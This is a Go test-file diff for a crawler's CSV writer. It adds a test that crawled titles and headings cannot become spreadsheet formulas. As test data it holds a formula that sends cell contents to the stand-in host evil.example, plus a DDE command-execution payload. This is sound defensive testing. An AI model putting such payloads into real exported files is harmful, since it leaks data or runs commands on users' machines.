@@ -1,6 +1,7 @@
 package storage
 
 import (
+	"encoding/csv"
 	"encoding/json"
 	"os"
 	"path/filepath"
@@ -224,6 +225,40 @@ func TestWriterCSV(t *testing.T) {
 	// Check header has expected columns
 	if !strings.Contains(lines[0], "url") || !strings.Contains(lines[0], "status_code") {
 		t.Error("CSV header missing expected columns")
+	}
+}
+
+// A crawled title or h1 must not reach the CSV as a spreadsheet formula.
+func TestWriterCSVNeutralisesFormulas(t *testing.T) {
+	path := filepath.Join(t.TempDir(), "output.csv")
+	w, err := NewResultWriter(path, "csv")
+	if err != nil {
+		t.Fatalf("NewResultWriter: %v", err)
+	}
+	page := testPage()
+	page.Title.Text = "=WEBSERVICE(\"https://evil.example/\"&A1)"
+	page.Headings.H1 = []string{"@SUM(1+1)*cmd|' /C calc'!A0"}
+	if err := w.Write(page); err != nil {
+		t.Fatalf("Write: %v", err)
+	}
+	if err := w.Close(); err != nil {
+		t.Fatalf("Close: %v", err)
+	}
+	data, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	rows, err := csv.NewReader(strings.NewReader(string(data))).ReadAll()
+	if err != nil || len(rows) != 2 {
+		t.Fatalf("rows %d, err %v", len(rows), err)
+	}
+	for i, cell := range rows[1] {
+		if cell != "" && strings.ContainsRune("=+@\t\r", rune(cell[0])) {
+			t.Errorf("column %s = %q starts a formula", rows[0][i], cell)
+		}
+		if rows[0][i] == "title" && cell != "'"+page.Title.Text {
+			t.Errorf("title = %q", cell)
+		}
 	}
 }
 
